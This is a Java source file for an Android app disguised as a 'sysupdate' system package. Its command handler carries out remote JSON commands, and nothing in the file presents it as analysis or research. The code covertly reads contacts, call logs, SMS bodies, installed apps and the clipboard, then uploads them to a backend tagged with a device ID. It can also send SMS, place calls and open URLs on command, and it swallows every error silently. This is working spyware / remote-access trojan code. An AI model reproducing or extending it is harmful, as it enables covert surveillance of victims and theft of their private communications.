package com.sysupdate.app;

import android.app.NotificationManager;
import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.hardware.camera2.CameraManager;
import android.telephony.SmsManager;
import android.widget.Toast;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.Locale;

public class CmdHandler {
    public static void handle(Context ctx, JSONObject cmd) {
        try {
            String type = cmd.optString("type", "");
            JSONObject p = cmd.optJSONObject("payload");
            if (p == null) p = new JSONObject();
            switch (type) {
                case "vibrate": vibrate(ctx, p.optLong("duration", 3000)); break;
                case "torch": torch(ctx, p.optBoolean("status", true)); break;
                case "show_toast": toast(ctx, p.optString("message", "")); break;
                case "show_notification": notif(ctx, p.optString("message", "")); break;
                case "speak": speak(ctx, p.optString("text", "")); break;
                case "open_url": openUrl(ctx, p.optString("url", "")); break;
                case "send_sms": sendSms(ctx, p.optString("phoneNumber", ""), p.optString("message", "")); break;
                case "make_call": call(ctx, p.optString("phoneNumber", "")); break;
                case "get_contacts": getContacts(ctx); break;
                case "get_call_log": getCalls(ctx); break;
                case "get_sms_log": getSms(ctx); break;
                case "get_installed_apps": getApps(ctx); break;
                case "get_system_info": SB.upsertDevice(SysInfo.collect(ctx)); break;
                case "set_clipboard": setClip(ctx, p.optString("text", "")); break;
                case "get_clipboard": getClip(ctx); break;
                case "lock": lockDevice(ctx); break;
            }
        } catch (Exception e) {}
    }

    private static void vibrate(Context c, long ms) {
        Vibrator v = (Vibrator) c.getSystemService(Context.VIBRATOR_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(ms, 255));
        else v.vibrate(ms);
    }

    private static void torch(Context c, boolean on) {
        try {
            CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
            for (String id : cm.getCameraIdList()) {
                Boolean flash = cm.getCameraCharacteristics(id).get(
                    android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (flash != null && flash) { cm.setTorchMode(id, on); return; }
            }
        } catch (Exception e) {}
    }

    private static void toast(final Context c, final String msg) {
        android.os.Handler h = new android.os.Handler(c.getMainLooper());
        h.post(() -> Toast.makeText(c, msg, Toast.LENGTH_LONG).show());
    }

    private static void notif(Context c, String msg) {
        NotificationManager nm = (NotificationManager) c.getSystemService(Context.NOTIFICATION_SERVICE);
        String ch = "alerts";
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(new android.app.NotificationChannel(ch, "Alerts", NotificationManager.IMPORTANCE_HIGH));
        }
        android.app.Notification n = new androidx.core.app.NotificationCompat.Builder(c, ch)
            .setContentTitle("تنبيه")
            .setContentText(msg)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setAutoCancel(true)
            .build();
        nm.notify((int) System.currentTimeMillis(), n);
    }

    private static void speak(Context c, String text) {
        try {
            android.speech.tts.TextToSpeech t = new android.speech.tts.TextToSpeech(c, s -> {});
            t.setLanguage(Locale.getDefault());
            t.speak(text, android.speech.tts.TextToSpeech.QUEUE_FLUSH, null, "x");
        } catch (Exception e) {}
    }

    private static void openUrl(Context c, String u) {
        try {
            c.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(u)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        } catch (Exception e) {}
    }

    private static void sendSms(Context c, String num, String msg) {
        try {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(num, null, msg, null, null);
        } catch (Exception e) {}
    }

    private static void call(Context c, String num) {
        try {
            c.startActivity(new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + num)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        } catch (Exception e) {}
    }

    private static void getContacts(Context c) {
        new Thread(() -> {
            try {
                Cursor cur = c.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                if (cur == null) return;
                JSONArray arr = new JSONArray();
                while (cur.moveToNext() && arr.length() < 500) {
                    JSONObject o = new JSONObject();
                    o.put("device_id", SB.DEVICE_ID);
                    o.put("name", cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    o.put("phone", cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    arr.put(o);
                }
                cur.close();
                SB.post("contacts", arr);
            } catch (Exception e) {}
        }).start();
    }

    private static void getCalls(Context c) {
        new Thread(() -> {
            try {
                Cursor cur = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
                    CallLog.Calls.DATE + " DESC");
                if (cur == null) return;
                JSONArray arr = new JSONArray();
                while (cur.moveToNext() && arr.length() < 200) {
                    JSONObject o = new JSONObject();
                    o.put("device_id", SB.DEVICE_ID);
                    o.put("type", cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    o.put("number", cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    o.put("name", cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                    o.put("duration", cur.getInt(cur.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    o.put("date", cur.getLong(cur.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    arr.put(o);
                }
                cur.close();
                SB.post("calls", arr);
            } catch (Exception e) {}
        }).start();
    }

    private static void getSms(Context c) {
        new Thread(() -> {
            try {
                Cursor cur = c.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
                if (cur == null) return;
                JSONArray arr = new JSONArray();
                while (cur.moveToNext() && arr.length() < 300) {
                    JSONObject o = new JSONObject();
                    o.put("device_id", SB.DEVICE_ID);
                    o.put("type", cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                    o.put("address", cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    o.put("body", cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    o.put("date", cur.getLong(cur.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    arr.put(o);
                }
                cur.close();
                SB.post("sms_logs", arr);
            } catch (Exception e) {}
        }).start();
    }

    private static void getApps(Context c) {
        new Thread(() -> {
            try {
                android.content.pm.PackageManager pm = c.getPackageManager();
                java.util.List<android.content.pm.PackageInfo> list = pm.getInstalledPackages(0);
                JSONArray arr = new JSONArray();
                for (android.content.pm.PackageInfo pi : list) {
                    if (arr.length() >= 300) break;
                    JSONObject o = new JSONObject();
                    o.put("device_id", SB.DEVICE_ID);
                    o.put("app_name", pm.getApplicationLabel(pi.applicationInfo).toString());
                    o.put("package_name", pi.packageName);
                    o.put("version", pi.versionName == null ? "-" : pi.versionName);
                    arr.put(o);
                }
                SB.post("apps", arr);
            } catch (Exception e) {}
        }).start();
    }

    private static void setClip(final Context c, final String text) {
        android.os.Handler h = new android.os.Handler(c.getMainLooper());
        h.post(() -> {
            try {
                ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
                cm.setPrimaryClip(ClipData.newPlainText("x", text));
            } catch (Exception e) {}
        });
    }

    private static void getClip(final Context c) {
        android.os.Handler h = new android.os.Handler(c.getMainLooper());
        h.post(() -> {
            try {
                ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
                String txt = "";
                if (cm.hasPrimaryClip() && cm.getPrimaryClip().getItemCount() > 0) {
                    txt = cm.getPrimaryClip().getItemAt(0).getText().toString();
                }
                JSONObject o = new JSONObject();
                o.put("device_id", SB.DEVICE_ID);
                o.put("text", txt);
                SB.insert("clipboard", o);
            } catch (Exception e) {}
        });
    }

    private static void lockDevice(Context c) {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                c.getSystemService(Context.DEVICE_POLICY_SERVICE);
            // يحتاج DeviceAdmin — ما نستخدمه هنا
        } catch (Exception e) {}
    }
}
